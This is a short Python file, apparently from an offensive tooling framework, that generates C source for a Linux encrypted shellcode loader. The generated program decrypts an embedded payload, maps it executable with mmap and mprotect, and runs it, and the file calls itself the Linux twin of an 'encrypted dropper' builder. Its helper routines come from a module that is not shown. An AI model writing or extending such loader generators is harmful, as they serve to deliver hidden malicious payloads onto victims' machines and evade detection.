#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generate C source for a minimal Linux encrypted shellcode loader (mmap + mprotect RX)."""

from __future__ import annotations

from lib.compile.linux_injection_common import LinuxInjectionBuilder


class ElfShellcodeLoaderBuilder(LinuxInjectionBuilder):
    """Linux equivalent of EncryptedDropperBuilder: mmap decrypt execute."""

    def build_source(self, encoded_payload: str, key: bytes, iv=None) -> str:
        return f"""
{chr(10).join(self.headers())}

char* enc_payload = "{encoded_payload}";

int main(void)
{{
{self.decode_preamble()}
{self.decrypt_block(key, iv)}
{self.exec_shellcode_block()}
{self.cleanup_block()}
    return 0;
}}
"""
